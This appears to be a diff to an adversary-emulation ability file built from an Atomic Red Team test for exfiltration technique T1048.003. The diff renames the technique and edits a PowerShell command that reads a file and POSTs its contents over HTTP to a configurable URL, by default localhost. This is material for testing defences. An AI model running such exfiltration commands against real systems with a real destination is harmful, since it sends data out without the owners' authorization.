@@ -8,22 +8,22 @@
   tactic: exfiltration
   technique:
     attack_id: T1048.003
-    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated
-      Non-C2 Protocol'
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2
+      Protocol'
   platforms:
     windows:
       psh:
         command: $content = Get-Content C:\Windows\System32\notepad.exe; Invoke-WebRequest
-          -Uri http://127.0.0.1 -Method POST -Body $content
+          -Uri http://127.0.0.1 -Method POST -Body $content -UseBasicParsing
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - t1048.003
-  - atomic-red-team
   - exfiltration
+  - atomic-red-team
+  - t1048.003
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -37,4 +37,4 @@
         default: http://127.0.0.1
     technique_created: '2020-03-15T15:37:47.583Z'
     atomic_guid: 6aa58451-1121-4490-a8e9-1dada3f1c68c
-    import_timestamp: '2026-10-20T07:08:31.138580Z'
+    import_timestamp: '2026-10-21T07:01:52.912783Z'
